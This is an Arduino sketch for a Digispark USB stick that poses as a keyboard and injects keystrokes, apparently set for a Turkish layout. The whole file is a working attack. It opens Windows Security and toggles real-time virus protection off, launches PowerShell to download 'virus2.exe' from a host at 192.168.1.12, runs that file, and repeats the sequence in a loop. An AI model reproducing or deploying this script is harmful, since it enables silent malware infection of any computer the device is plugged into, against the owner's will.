#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(0);
 
}

void loop() 
{

  //DISABLE ANTIVIRUS
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("Virus and threat protection");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);


  //DOWNLOAD VIRUS
  
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("$client.DownloadFile('http://192.168.1.12/virus2.exe','virus2.exe')");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
  
  //EXECUTE VIRUS
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("virus2.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  
  DigiKeyboard.delay(20000);
}
